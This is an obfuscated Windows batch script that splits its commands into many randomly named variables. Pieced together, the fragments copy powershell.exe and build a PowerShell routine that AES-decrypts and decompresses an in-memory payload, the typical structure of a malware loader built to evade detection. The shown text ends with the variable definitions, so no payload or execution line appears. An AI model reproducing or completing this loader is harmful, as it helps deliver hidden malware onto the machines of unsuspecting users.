@echo off
set "fSpgnhjxsE= C"
set "PQtSOWrPVA=he"
set "AqLfhTGdDp=rS"
set "IxqtDCfCKP=Wi"
set "vpNJYfvOrx=we"
set "CyfimyTPha=py"
set "wovxyYPmVW=in"
set "svLngbuNGk=xe"
set "CrdDcwXFdX=rs"
set "ULokLcMEGb=co"
set "hbLENleiND=Po"
set "eIJPCqaPlW=po"
set "RCHsTilDXF=ws"
set "mdQoDbsAsZ=\W"
set "NxlzeRqGxT=\v"
set "RNGvgZNQuH=we"
set "SolcTxpcKj=ow"
set "EbFyQjaxUQ=1."
set "mcRAGACeDj=em"
set "tlfFcNEfMf=.e"
set "LrzGwhbAnE=0\"
set "btolRCOYuO=ll"
set "IXUUyqgfEf= /"
set "jllXYXLeAw=ll"
set "NmoqOhudpL=he"
set "jgIcWfBcPn=do"
set "hvUWRbwiXE=nd"
set "hfidxcpmWr=:\"
set "bHMCwMkmlw=Sy"
set "iGTQsIBVDL=s\"
set "Ghosytlnzg=st"
set "zAFmClBJFh=32"
set "LTeGEEKNQb=y "
set "ZRxrAnyxVx=cd"
set "kTdGdBmzpQ= %~dp0"
set "CVDzjIIhAN=($JD"
set "TJITPUWenM=onve"
set "PcmlpgTZyr=ach "
set "SVmfbIXpBt=dqxB"
set "bOazWgUvxJ=$ubX"
set "UCNpvEvger= [Sy"
set "KsmGyNOOlu=ptor"
set "dwyWRCeGUY=.Com"
set "EeuzWblqmg=PKln"
set "zMFBwxWzLe=n ''"
set "YDJfKpUVao=esMa"
set "YGfwEIVfVC=UGTu"
set "bJakEGtqpn=tion"
set "cfwriuRjCJ=d;$h"
set "LyWhdPvBWZ=fore"
set "QODwzxasnL=pStr"
set "lFEdqJmpgg=1] -"
set "PBMZPmgSbD== $h"
set "dQfwYtSYxZ=;$sU"
set "oAeDLIzlIz=hllu"
set "NwlVEwjgvl=It ="
set "WftvOkdRUB=y.Ci"
set "OBIKQpGzVn=gth)"
set "KsncCWWUHO=);$h"
set "wkZEYoiSaF=ptog"
set "kzjhBhJngo=urit"
set "otSQzQjOxn=ne);"
set "lTrbKIcucS=;$sU"
set "ICSredIgLG=PKCS"
set "WKVuacjGLN=rt]:"
set "jFkZJsJtWW=tem."
set "dfZQZCfrSq=$hPK"
set "CABeoxhpAp=mory"
set "kWTDWSsKIl=736u"
set "cAyaXCEHuR=3); "
set "JiycFpyuiA=, (,"
set "OErBIZciiX=rofi"
set "uaemvtSslI=$NEx"
set "qujUYIaoSR=)($d"
set "pXxawhTtYz=form"
set "HFtEiFrJly=trea"
set "GxzhXmHUbq=ct S"
set "RlrHPqwzcF=pose"
set "gsCJYBnkDj=Comp"
set "kwvHMlhdgI=).Sp"
set "CHsCTpMtxQ=7Yiv"
set "xCiTrqwVss=tem."
set "hlRmIFsCWM=.Mem"
set "JSnjsYbhbe=g = "
set "hdoeGQHbUe=k; }"
set "nbzYKxNsZj=yste"
set "maXUVpHsVY=ecry"
set "oIrxidAjtV=$NEx"
set "KcHgQsOiGy=tsWi"
set "fwFLvdDNXg=Fina"
set "fhwHFqaHCt=);$a"
set "yewiiygllI=;$al"
set "DcGqEiZvDf=V = "
set "iUeoPPATPB=::De"
set "IceIhhxyEj=S46e"
set "lagPWzIJfC=m.IO"
set "PfXpvZYUul=$NEx"
set "DeFGhERRih=New-"
set "hUAJnadyRX=();$"
set "EWAsEVKVaR=hllu"
set "lrYzclOqiy=BC;$"
set "qXTLaLFntY=rtS4"
set "KdVqrEgbVD=;$al"
set "aMSTmujJFk=ye ="
